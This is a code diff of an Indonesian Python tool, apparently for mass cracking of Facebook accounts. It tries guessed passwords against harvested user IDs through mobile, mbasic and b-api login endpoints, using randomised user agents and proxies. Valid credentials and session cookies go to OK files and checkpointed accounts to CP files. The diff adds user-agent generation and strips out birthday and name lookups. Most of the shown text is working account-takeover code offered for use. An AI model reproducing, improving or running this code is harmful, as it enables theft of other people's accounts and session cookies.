@@ -8,6 +8,11 @@
      # Fb : Hikmat Ceremony Queenz Sr.
      # Whastapp : 082115413282
 
+# Grup Whastapp Admin : https://chat.whatsapp.com/DvXb23TbzQ1CfDvXwr2ifj
+# Script Ini 100% Open Source Code:) 
+# Kalo Ada Yang Jual Script Gw Bilang Yak! 
+# Hai Perikod:) 
+
 import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask
 
 from concurrent.futures import ThreadPoolExecutor as tread
@@ -26,6 +31,37 @@ cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
 okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
 id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD,akun=[],0,[],[],[],0,0,[],[],[],[],0,[]
 pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
+
+for xd in range(10000):
+	a='Mozilla/5.0 (Linux; Android 4.1.2;'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='GT-N8000'
+	e=random.randrange(100, 9999)
+	f='Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Iron Safari/537.36'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ua_crack.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' Nexus 6P Build/MMB29P)'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ua_crack.append(uaku2)
 
 for xyzx in range(1000):
 	rr = random.randint
@@ -143,9 +179,10 @@ P3 = "#FFFFFF" # PUTIH
 J2 = "[#FF8F00]" # JINGGA
 J3 = "#FF8F00" # JINGGA
 A2 = "[#AAAAAA]" # ABU-ABU
+warna_warni_biasa=random.choice([H,K,M,O,B,U])
 warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
 warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
-garis = f" {P}[{H}•{P}]"
+garis = f" {P}[{warna_warni_biasa}•{P}]"
 
 now = datetime.datetime.now()
 hour = now.hour
@@ -180,7 +217,7 @@ def tahun(fx):
 		elif fx[:5] in ['10003']           :tahunz = '2018'
 		elif fx[:5] in ['10004']           :tahunz = '2019'
 		elif fx[:5] in ['10005']           :tahunz = '2020'
-		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021'
+		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
 		else:tahunz=''
 	elif len(fx) in [9,10]:
 		tahunz = '2008-2009'
@@ -244,7 +281,7 @@ def login():
 	print("")
 	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
+	cukuf = input(f" {P}[{warna_warni_biasa}•{P}] pilih : {H}")
 	if cukuf in ["help","Help","HELP"]:
 		print("")
 		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
@@ -253,7 +290,7 @@ def login():
 		x=f"{P2}sedang diarahkan ke whastapp author"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
-		input(f" {P}[{H}•{P}] kembali")
+		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
 		login()
 	elif cukuf in ["1","01"]:
 		login_cookie()
@@ -265,7 +302,7 @@ def login():
 		x=f"{P2}sedang diarahkan ke whastapp author"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
-		input(f" {P}[{H}•{P}] kembali")
+		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
 		login()
 	elif cukuf in ["0","00"]:
 		exit()
@@ -789,13 +826,15 @@ def crack_public_pilihan():
 	else:
 		jalan(f"{garis} isi yang benar ")
 		crack_public_pilihan()
-	tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
-	if tamtttl in ["y","Y","ya"]:
-		tampilkan_ttl.append("ya")
-	elif tamtttl in ["t","T","tidak"]:
-		tampilkan_ttl.append("no")
-	else:
-		tampilkan_ttl.append("no")
+	x=f"{P2}recomended pilih {H2}t{P2}"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	#tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	#if tamtttl in ["y","Y","ya"]:
+		#tampilkan_ttl.append("ya")
+	#elif tamtttl in ["t","T","tidak"]:
+		#tampilkan_ttl.append("no")
+	#else:
+		#tampilkan_ttl.append("no")
 	nanya_opsi = input(garis+" ingin memunculkan opsi detect ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if nanya_opsi in ["y","ya","Y"]:
 		tampilkan_opsi.append("ya")
@@ -936,38 +975,12 @@ def mobile(uiz,pwr):
 				if "ya" in tampilkan_opsi:
 					opsi_detect(uiz,pw)
 				elif "no" in tampilkan_opsi:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
-						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
 					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
-				else:continue
-				break
+					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if "no" in tampilkan_ttl:
+				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
@@ -975,31 +988,15 @@ def mobile(uiz,pwr):
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
 					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						coki=po.cookies.get_dict()
-						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
-						print("\r %s*--> %s "%(H,kuki))
-						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-						ok+=1
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
+				elif "ya" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
+					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
-				else:continue
-				break
+					break
 					
 			else:
 				continue
@@ -1072,38 +1069,12 @@ def mobile_v2(uiz,pwr):
 				if "ya" in tampilkan_opsi:
 					opsi_detect(uiz,pw)
 				elif "no" in tampilkan_opsi:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
-						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
 					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
-				else:continue
-				break
+					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if "no" in tampilkan_ttl:
+				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
@@ -1111,31 +1082,15 @@ def mobile_v2(uiz,pwr):
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
 					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						coki=po.cookies.get_dict()
-						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
-						print("\r %s*--> %s "%(H,kuki))
-						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-						ok+=1
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
+				elif "ya" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
+					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
-				else:continue
-				break
+					break
 					
 			else:
 				continue
@@ -1168,38 +1123,20 @@ def mbasic(uiz,pwr):
 				if "ya" in tampilkan_opsi:
 					opsi_detect(uiz,pw)
 				elif "no" in tampilkan_opsi:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
-						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
 					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
-				else:continue
-				break
+					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if "ya" in tampilkan_apk:
+				if "no" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
@@ -1208,47 +1145,6 @@ def mbasic(uiz,pwr):
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
 					break
-				elif "no" in tampilkan_apk:
-					coki=po.cookies.get_dict()
-					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
-					print("\r %s*--> %s "%(H,kuki))
-					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-					ok+=1
-					break
-				if "no" in tampilkan_ttl:
-					coki=po.cookies.get_dict()
-					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
-					print("\r %s*--> %s "%(H,kuki))
-					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-					ok+=1
-					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						coki=po.cookies.get_dict()
-						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
-						print("\r %s*--> %s "%(H,kuki))
-						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-						ok+=1
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
-					print("\r %s*--> %s "%(H,kuki))
-					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-					ok+=1
-				else:continue
-				break
 					
 			else:
 				continue
@@ -1280,38 +1176,12 @@ def free(uiz,pwr):
 				if "ya" in tampilkan_opsi:
 					opsi_detect(uiz,pw)
 				elif "no" in tampilkan_opsi:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				if "no" in tampilkan_ttl:
-					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-					cp+=1
-					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
-						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
 					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
-				else:continue
-				break
+					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if "no" in tampilkan_ttl:
+				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
@@ -1319,31 +1189,15 @@ def free(uiz,pwr):
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
 					break
-				elif "ya" in tampilkan_ttl:
-					try:
-						coki=po.cookies.get_dict()
-						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-						token = open('token.txt','r').read()
-						cookie = open('cookie.txt','r').read()
-						coki = {"cookie":cookie}
-						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-						x = json.loads(xn.text)
-						ttl = x['birthday']
-						nama_ = x["name"]
-						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
-						print("\r %s*--> %s "%(H,kuki))
-						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
-						ok+=1
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
+				elif "ya" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
+					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
-				else:continue
-				break
+					break
 					
 			else:
 				continue
@@ -1366,58 +1220,14 @@ def api(uiz,pwr):
 		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
 		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
 		if "session_key" in response.text and "EAAG" in response.text:
-			if "no" in tampilkan_ttl:
-				print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
-				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
-				ok+=1
-				break
-			elif "ya" in tampilkan_ttl:
-				try:
-					token = open('token.txt','r').read()
-					cookie = open('cookie.txt','r').read()
-					coki = {"cookie":cookie}
-					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-					x = json.loads(xn.text)
-					ttl = x['birthday']
-					nama_ = x["name"]
-						#id_ = x["id"]
-					print("\r %s*--> %s|%s|%s|%s • %s"%(H,nama_,uiz,pw,ttl,tahun(uiz)))
-					open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
-					break
-				except(KeyError, IOError):
-					ttl = " "
-				except:pass
-				print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
-				open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
-				ok+=1
-			else:continue
+			print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+			open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
+			ok+=1
 			break
 		elif "www.facebook.com" in response.json()["error_msg"]:
-			if "no" in tampilkan_ttl:
-				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-				open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
-				cp+=1
-				break
-			elif "ya" in tampilkan_ttl:
-				try:
-					token = open('token.txt','r').read()
-					cookie = open('cookie.txt','r').read()
-					coki = {"cookie":cookie}
-					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
-					x = json.loads(xn.text)
-					ttl = x['birthday']
-					nama_ = x["name"]
-						#id_ = x["id"]
-					print("\r %s*--> %s|%s|%s|%s • %s"%(K,nama_,uiz,pw,ttl,tahun(uiz)))
-					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-					break
-				except(KeyError, IOError):
-					ttl = " "
-				except:pass
-				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
-				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-				cp+=1
-			else:continue
+			print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+			open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+			cp+=1
 			break
 		else:
 			continue
